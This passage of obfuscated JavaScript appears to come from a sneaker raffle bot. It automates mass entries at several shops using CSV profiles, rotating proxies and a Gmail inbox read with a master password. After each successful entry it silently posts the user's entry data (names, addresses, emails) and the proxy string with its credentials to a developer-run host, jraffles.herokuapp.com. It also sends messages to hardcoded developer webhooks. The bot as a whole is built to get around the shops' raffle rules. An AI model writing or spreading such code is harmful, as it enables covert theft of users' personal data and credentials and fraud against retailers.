                            console['log'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5a0407['waitForSelector']('#username'), await _0x5a0407['type']('#username', _0xe6c71[_0x5afea4]['Email']), await _0x5a0407['waitForSelector']('#password'), await _0x5a0407['type']('#password', _0xe6c71[_0x5afea4]['Password']), await _0x5954fc(0x190), await _0x5a0407['click']('#buttonSubmit'), await _0x5a0407['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x5954fc(0x1f4), console['log'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0xe6c71[_0x5afea4]['Size']);
                            let _0xeeb9b2 = _0xe6c71[_0x5afea4]['Size']['replace']('.5', '\x201/2');
                            if (_0xeeb9b2['toUpperCase']() == 'RANDOM') {
                                const _0x1369cf = await _0x5a0407['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x1020c2 = Math['round'](Math['random']() * (_0x1369cf['length'] - 0x1));
                                await _0x1369cf[_0x1020c2]['click']();
                            } else
                                await _0x5a0407['click']('button[aria-label=\x22' + _0xeeb9b2 + '\x22]');
                            await _0x5954fc(0x1f4);
                            try {
                                await _0x5a0407['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x5954fc(0x12c), console['log'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5a0407['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x5954fc(0x12c), await _0x5a0407['type']('#dwfrm_raffle_addressFields_firstName', _0xe6c71[_0x5afea4]['FirstName']), await _0x5954fc(0x12c), await _0x5a0407['type']('#dwfrm_raffle_addressFields_lastName', _0xe6c71[_0x5afea4]['LastName']), await _0x5954fc(0x12c), await _0x5a0407['select']('#dwfrm_raffle_addressFields_country', _0xe6c71[_0x5afea4]['Country']), await _0x5954fc(0x12c), await _0x5a0407['type']('#dwfrm_raffle_addressFields_city', _0xe6c71[_0x5afea4]['City']), await _0x5954fc(0x12c);
                            _0xe6c71[_0x5afea4]['Postcode'] == undefined && (_0xe6c71[_0x5afea4]['Postcode'] = _0xe6c71[_0x5afea4]['Zip']);
                            await _0x5a0407['type']('#dwfrm_raffle_addressFields_postalCode', _0xe6c71[_0x5afea4]['Postcode']), await _0x5954fc(0x12c), await _0x5a0407['type']('#dwfrm_raffle_addressFields_address1', _0xe6c71[_0x5afea4]['Address1']), await _0x5954fc(0x12c), await _0x5a0407['type']('#dwfrm_raffle_addressFields_address2', _0xe6c71[_0x5afea4]['HouseNumber']), await _0x5954fc(0x12c), await _0x5a0407['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0xe6c71[_0x5afea4]['Address2']), await _0x5954fc(0x12c), await _0x5a0407['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x5954fc(0x12c), await _0x5a0407['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0xe6c71[_0x5afea4]['Follower']), await _0x5954fc(0x1f4), await _0x5a0407['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x5954fc(0x1f4), console['log'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20' + _0x28396b['blue']('Awaiting\x20Paypal\x20Payment')), await _0x5a0407['click']('.b-paypal_button');
                            try {
                                await _0x5a0407['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x4038e7 = 'no', _0x4904f4(_0xe6c71[_0x5afea4], _0x2d156e), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x2db0e0['succesDEVMSG']);
                                await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x2db0e0['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0x2db0e0['succesPUBMSG']);
                                let _0x53c8c6 = _0xe6c71[_0x5afea4];
                                try {
                                    prxdata = {
                                        'username': _0x4a7d40['replace']('#', ''),
                                        'module': _0x2d156e['name'],
                                        'entrydata': JSON['stringify'](_0x53c8c6),
                                        'proxy': '' + _0xf8d63a[_0x5afea4]
                                    };
                                    var _0x1fabf4 = JSON['stringify'](prxdata);
                                    let _0x59a4fe = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x1fabf4, _0x59a4fe);
                                } catch (_0x4089cb) {
                                }
                            } catch (_0x2b2cc3) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2b2cc3)), _0x222456 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2b2cc3;
                                var _0x219e59 = await _0xf2c38e(_0xe6c71[_0x5afea4], _0x2d156e, 'dev', !![], _0x222456);
                                _0x2db0e0['errorDEV'] = { 'embeds': [_0x219e59] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x2db0e0['errorDEV']), await _0x4bfa5b(_0x248b77, _0x2db0e0['errorDEV']);
                            }
                        } catch (_0x49690c) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20' + _0x49690c)), _0x222456 = '' + _0x49690c;
                            var _0x219e59 = await _0xf2c38e(_0xe6c71[_0x5afea4], _0x2d156e, 'dev', !![], _0x222456);
                            _0x2db0e0['errorDEV'] = { 'embeds': [_0x219e59] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x2db0e0['errorDEV']), await _0x4bfa5b(_0x248b77, _0x2db0e0['errorDEV']), _0x4038e7 = 'yes';
                        } finally {
                            _0x3ab365 && _0x3ab365['close']();
                            if (_0x4038e7 == 'yes' && _0x524e84 != 0x5) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x524e84 + '\x20/\x205)')), _0x5afea4 = _0x5afea4 - 0x1, _0x524e84 = _0x524e84 + 0x1;
                                continue;
                            }
                            _0x4038e7 == 'yes' && _0x524e84 >= 0x5 && (_0x1c26ba(_0xe6c71[_0x5afea4], _0x2d156e), _0x4038e7 = 'no', _0x524e84 = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['AfewDelay'] + '\x20ms'), await _0x5954fc(_0x5d2560['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2d8d77, _0x55b4f0, _0x4280ac) {
                    for (var _0x169547 = 0x0; _0x169547 < _0x55b4f0['length']; _0x169547++) {
                        try {
                            await _0x414596(_0x55b4f0, _0x169547);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x5ea69c(_0x1e483e, _0x2fb5f0, _0x3db90f, _0x566b4f, _0x475b99) {
                            var _0x2ad03d, _0x3adeee = {}, _0xff7355 = [], _0x14ebd3 = {}, _0x5c945e = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x29da87 = Math['round'](Math['random']() * (_0x5c945e['length'] - 0x1));
                            !_0x566b4f && (_0x566b4f = {});
                            if (_0x2fb5f0 != 'ver') {
                                _0x34c195(_0x3db90f['name'] + '\x20Task\x20' + (_0x1e483e + 0x1) + '\x20/\x20' + _0x566b4f['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f), await _0x414596(_0x566b4f, _0x1e483e), _0x3adeee = _0x3db90f['data'], _0x3adeee['data']['attributes']['email'] = '' + _0x566b4f[_0x1e483e]['Email'];
                                if (_0x566b4f[_0x1e483e]['Size'] == 'RANDOM') {
                                }
                                _0x3adeee['data']['attributes']['properties']['$first_name'] = '' + _0x566b4f[_0x1e483e]['FirstName'], _0x3adeee['data']['attributes']['properties']['$last_name'] = '' + _0x566b4f[_0x1e483e]['LastName'], _0x3adeee['data']['attributes']['properties']['$address1'] = _0x566b4f[_0x1e483e]['Address1'] + '\x20' + _0x566b4f[_0x1e483e]['Address2'] + '\x20' + _0x566b4f[_0x1e483e]['HouseNumber'], _0x3adeee['data']['attributes']['properties']['$zip'] = '' + _0x566b4f[_0x1e483e]['Zip'], _0x3adeee['data']['attributes']['properties']['$city'] = '' + _0x566b4f[_0x1e483e]['City'], _0x3adeee['data']['attributes']['properties']['$country'] = '' + _0x566b4f[_0x1e483e]['Country'], _0x566b4f[_0x1e483e]['Size'] == 'RANDOM' ? _0x3adeee['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5c945e[_0x29da87] : _0x3adeee['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x566b4f[_0x1e483e]['Size'], _0x3adeee['data']['attributes']['properties']['$phone_number'] = '' + _0x566b4f[_0x1e483e]['Phone'], _0x3adeee['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x566b4f[_0x1e483e]['Follower'];
                            }
                            if (_0x5d2560['useRandomProxy'] = ![])
                                var _0x2c8c17 = _0x475b99[_0x1e483e]['split'](':');
                            else
                                var _0x342dae = Math['round'](Math['random']() * (_0x475b99['length'] - 0x1)), _0x2c8c17 = _0x475b99[_0x342dae]['split'](':');
                            var _0x245d79 = {
                                'jar': _0xaed655,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x3db90f['url'],
                                'headers': _0x3db90f['headers'],
                                'body': JSON['stringify'](_0x3adeee),
                                'proxy': 'http://' + _0x2c8c17[0x2] + ':' + _0x2c8c17[0x3] + '@' + _0x2c8c17[0x0] + ':' + _0x2c8c17[0x1]
                            };
                            return _0x2fb5f0 != 'ver' && (_0x245d79['url'] = _0x3db90f['url'], _0x245d79['headers'] = _0x3db90f['headers']), _0x2fb5f0 == 'ver' && (_0x245d79['method'] = 'GET'), new Promise(function (_0x503fea, _0x1eb119) {
                                callback = async (_0x31d39a, _0x11dfd9, _0x66bfa1) => {
                                    if (!_0x31d39a && _0x11dfd9['statusCode'] == 0xca || !_0x31d39a && _0x11dfd9['statusCode'] == 0xc8) {
                                        if (_0x2fb5f0 != 'ver') {
                                            var _0x21c814 = await _0xf2c38e(_0x566b4f[_0x1e483e], _0x3db90f, 'dev', ![]), _0x1f0fb4 = await _0xf2c38e(_0x566b4f[_0x1e483e], _0x3db90f, 'pub', ![]);
                                            const _0x1e3a1d = {
                                                'succesDEVMSG': { 'embeds': [_0x21c814] },
                                                'succesPUBMSG': { 'embeds': [_0x1f0fb4] }
                                            };
                                            let _0x72fc3b = _0x566b4f[_0x1e483e];
                                            try {
                                                prxdata = {
                                                    'username': _0x4a7d40['replace']('#', ''),
                                                    'module': _0x3db90f['name'],
                                                    'entrydata': JSON['stringify'](_0x72fc3b),
                                                    'proxy': '' + _0x475b99[_0x1e483e]
                                                };
                                                var _0x52e71f = JSON['stringify'](prxdata);
                                                let _0x9320fa = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x52e71f, _0x9320fa);
                                            } catch (_0x1fbe75) {
                                            }
                                            if (_0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '')
                                                try {
                                                    await _0x4bfa5b(_0x5d2560['webhook'], _0x1e3a1d['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x1e3a1d['succesDEVMSG']), await _0x5954fc(0xc8);
                                            try {
                                                await _0x4bfa5b(_0x4b117a, _0x1e3a1d['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x4904f4(_0x566b4f[_0x1e483e], _0x3db90f);
                                        }
                                        _0x503fea(console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x3db90f['name'] + ']\x20Task\x20' + (_0x1e483e + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x2fb5f0 != 'ver') {
                                            var _0x101bc4 = '' + _0x31d39a, _0x45c589 = await _0xf2c38e(_0x566b4f[_0x1e483e], _0x3db90f, 'dev', !![], _0x101bc4), _0x50461f = {};
                                            _0x50461f['errorDEV'] = { 'embeds': [_0x45c589] }, _0x1c26ba(_0x566b4f[_0x1e483e], _0x3db90f), _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x50461f['errorDEV']), await _0x4bfa5b(_0x248b77, _0x50461f['errorDEV']);
                                        }
                                        _0x1eb119(console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x3db90f['name'] + ']\x20Task\x20' + (_0x1e483e + 0x1) + ':\x20' + _0x31d39a)));
                                    }
                                };
                                try {
                                    _0x2fb5f0 != 'ver' && console['log'](_0x52b59e() + '\x20[' + _0x3db90f['name'] + ']\x20Task\x20' + (_0x1e483e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3adeee['data']['attributes']['email']), _0x5e7aa2(_0x245d79, callback);
                                } catch (_0x1b9cb9) {
                                    console['log'](_0x52b59e() + '\x20Task\x20' + (_0x1e483e + 0x1) + ':\x20' + _0x1b9cb9);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x5ea69c(_0x169547, 'nor', _0x2d8d77, _0x55b4f0, _0x4280ac), console['log'](_0x52b59e() + '\x20[' + _0x2d8d77['name'] + ']\x20Sleeping\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        } catch (_0x52c5a8) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x18b2cd, _0x551e59, _0x48a9c9) {
                    var _0x3c2186 = [], _0x21adc8 = ![];
                    async function _0x27d2dd() {
                        var _0x42a6bc = new _0x15c146({
                            'user': _0x5d2560['masterMail'],
                            'password': _0x5d2560['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x334e03(_0x570a17) {
                            _0x42a6bc['openBox']('INBOX', ![], _0x570a17);
                        }
                        _0x42a6bc['once']('ready', function () {
                            _0x334e03(function (_0x3b8aa8, _0x2e6e61) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3b8aa8)
                                    throw _0x3b8aa8;
                                _0x42a6bc['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x2b8d71, _0x471a11) {
                                    if (!_0x471a11 || !_0x471a11['length'])
                                        console['log'](_0x52b59e() + '\x20[' + _0x18b2cd['name'] + ']\x20No\x20mails\x20found'), _0x42a6bc['end']();
                                    else {
                                        var _0x2cb643 = _0x42a6bc['seq']['fetch'](_0x471a11, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2cb643['on']('message', function (_0x4d4772, _0x48ba17) {
                                            var _0x4ab1ec = '(#' + _0x48ba17 + ')\x20';
                                            _0x4d4772['on']('body', function (_0x4e3d58, _0x2b6fa4) {
                                                _0x2e3fa0(_0x4e3d58, (_0x64021e, _0x5a1f00) => {
                                                    var _0x3c7688 = _0x5a1f00['text']['split']('(')[0x1], _0x582c2e = _0x3c7688['split'](')')[0x0];
                                                    _0x3c2186['push'](_0x582c2e);
                                                });
                                            }), _0x4d4772['once']('end', function () {
                                            });
                                        }), _0x2cb643['once']('error', function (_0x13c6de) {
                                            console['log']('Fetch\x20error:\x20' + _0x13c6de), _0x21adc8 = !![];
                                        }), _0x2cb643['once']('end', function () {
                                            _0x42a6bc['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x42a6bc['once']('error', function (_0x336543) {
                            console['log'](_0x28396b['red'](_0x336543['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x21adc8 = !![];
                        }), _0x42a6bc['once']('end', async function () {
                            _0x21adc8 = !![];
                        }), _0x42a6bc['connect']();
                    }
                    async function _0x50bfab(_0xbb0e4d, _0x71f968, _0x45efb1) {
                        for (var _0x373ec0 = 0x0; _0x373ec0 < _0x71f968['length']; _0x373ec0++) {
                            async function _0x2f2f69(_0xe245e4, _0x29f0b1, _0x3441b8, _0x18038f, _0x39b398) {
                                var _0x46d7b0, _0x327393 = {}, _0x2b43ad = [], _0xcfe011 = {}, _0x4428e4 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1e7b4f = Math['round'](Math['random']() * (_0x4428e4['length'] - 0x1));
                                _0x18038f[_0xe245e4]['Size'] == 'RANDOM' && (_0x18038f[_0xe245e4]['Size'] = _0x4428e4[_0x1e7b4f]);
                                !_0x18038f && (_0x18038f = {});
                                if (_0x5d2560['useRandomProxy'] = ![])
                                    var _0x21dcef = _0x39b398[_0xe245e4]['split'](':');
                                else
                                    var _0x3c657c = Math['round'](Math['random']() * (_0x39b398['length'] - 0x1)), _0x21dcef = _0x39b398[_0x3c657c]['split'](':');
                                var _0x46f39d = {
                                    'jar': _0xaed655,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3441b8['url'],
                                    'headers': _0x3441b8['headers'],
                                    'body': JSON['stringify'](_0x327393),
                                    'proxy': 'http://' + _0x21dcef[0x2] + ':' + _0x21dcef[0x3] + '@' + _0x21dcef[0x0] + ':' + _0x21dcef[0x1]
                                };
                                return _0x29f0b1 != 'ver' && (_0x46f39d['url'] = _0x3441b8['url'], _0x46f39d['headers'] = _0x3441b8['headers']), _0x29f0b1 == 'ver' && (_0x46f39d['method'] = 'GET', _0x46f39d['url'] = _0x18038f[_0xe245e4]), new Promise(function (_0x1d89aa, _0x3f68c8) {
                                    callback = async (_0x26e942, _0x4d12ed, _0x39704a) => {
                                        if (!_0x26e942 && _0x4d12ed['statusCode'] == 0xca || !_0x26e942 && _0x4d12ed['statusCode'] == 0xc8) {
                                            if (_0x29f0b1 != 'ver') {
                                                var _0x36604a = await _0xf2c38e(_0x18038f[_0xe245e4], _0x3441b8, 'dev', ![]), _0x281e7a = await _0xf2c38e(_0x18038f[_0xe245e4], _0x3441b8, 'pub', ![]);
                                                const _0x1cdfa6 = {
                                                    'succesDEVMSG': { 'embeds': [_0x36604a] },
                                                    'succesPUBMSG': { 'embeds': [_0x281e7a] }
                                                };
                                                if (_0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '')
                                                    try {
                                                        await _0x4bfa5b(_0x5d2560['webhook'], _0x1cdfa6['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x1cdfa6['succesDEVMSG']), await _0x5954fc(0xc8);
                                                try {
                                                    await _0x4bfa5b(_0x4b117a, _0x1cdfa6['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4904f4(_0x18038f[_0xe245e4], _0x3441b8);
                                            }
                                            _0x1d89aa(console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x3441b8['name'] + ']\x20Task\x20' + (_0xe245e4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x29f0b1 != 'ver') {
                                                var _0x47208d = '' + _0x26e942, _0x5b445f = await _0xf2c38e(_0x18038f[_0xe245e4], _0x3441b8, 'dev', !![], _0x47208d), _0x21fa8b = {};
                                                _0x21fa8b['errorDEV'] = { 'embeds': [_0x5b445f] }, _0x1c26ba(_0x18038f[_0xe245e4], _0x3441b8), _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x21fa8b['errorDEV']), await _0x4bfa5b(_0x248b77, _0x21fa8b['errorDEV']);
                                            }
                                            _0x3f68c8(console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x3441b8['name'] + ']\x20Task\x20' + (_0xe245e4 + 0x1) + ':\x20' + _0x26e942)));
                                        }
                                    };
                                    try {
                                        _0x29f0b1 != 'ver' ? console['log'](_0x52b59e() + '\x20[' + _0x3441b8['name'] + ']\x20Task\x20' + (_0xe245e4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x327393['data']['attributes']['email']) : console['log'](_0x52b59e() + '\x20[' + _0x3441b8['name'] + ']\x20Task\x20' + (_0xe245e4 + 0x1) + ':\x20Fetching\x20Response'), _0x5e7aa2(_0x46f39d, callback);
                                    } catch (_0x4bd4c3) {
                                        console['log'](_0x52b59e() + '\x20Task\x20' + (_0xe245e4 + 0x1) + ':\x20' + _0x4bd4c3);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2f2f69(_0x373ec0, 'ver', _0xbb0e4d, _0x71f968, _0x45efb1), console['log'](_0x52b59e() + '\x20[' + _0xbb0e4d['name'] + ']\x20Sleeping\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                            } catch (_0x4e39ef) {
                            }
                        }
                    }
                    try {
                        _0x27d2dd();
                        while (!_0x21adc8) {
                            await _0x5954fc(0xbb8);
                        }
                        console['log']('Found\x20' + _0x3c2186['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x5954fc(0x9c4);
                    }
                    await _0x50bfab(_0x18b2cd, _0x3c2186, _0x48a9c9);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x277967, _0x376300, _0x1d65b7) {
                    var _0x430c3f = _0x376300, _0x570523 = 0x0;
                    for (var _0x585281 = 0x0; _0x585281 < _0x376300['length']; _0x585281++) {
                        maxTasks = _0x5d2560['threads'];
                        while (_0x570523 >= maxTasks) {
                            await _0x5954fc(_0x5d2560['delay']);
                        }
                        async function _0x5cc9ed(_0x3d7362, _0x6eb5e5, _0x25e207, _0x1e597a) {
                            try {
                                await _0x414596(_0x6eb5e5, _0x1e597a);
                            } catch (_0x39e7f7) {
                                throw new Error(_0x39e7f7);
                            }
                            async function _0x14605f(_0x350a6c, _0x45ab87, _0x288754, _0x2c9cb3, _0x3abfb3) {
                                _0x570523++;
                                var _0x12875a, _0x1052ce = {}, _0xb8b6ca = [], _0x46fb8a = {}, _0x5adebc = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x8cc820 = Math['round'](Math['random']() * (_0x5adebc['length'] - 0x1));
                                !_0x2c9cb3 && (_0x2c9cb3 = {});
                                if (_0x45ab87 != 'ver') {
                                    _0x34c195(_0x288754['name'] + '\x20Task\x20' + (_0x350a6c + 0x1) + '\x20/\x20' + _0x2c9cb3['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f), _0xb8b6ca = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x4a7d40
                                            },
                                            {
                                                'name': 'Size',
